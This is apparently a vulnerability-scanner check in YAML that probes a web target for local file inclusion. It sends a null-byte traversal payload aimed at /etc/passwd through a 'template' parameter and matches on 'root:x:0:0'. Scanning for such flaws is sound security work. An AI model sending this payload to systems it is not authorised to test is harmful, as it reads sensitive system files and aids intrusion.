id: lfi3-095
name: 'Traversal to passwd via template'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via template'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      template:
        - '..%00/../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
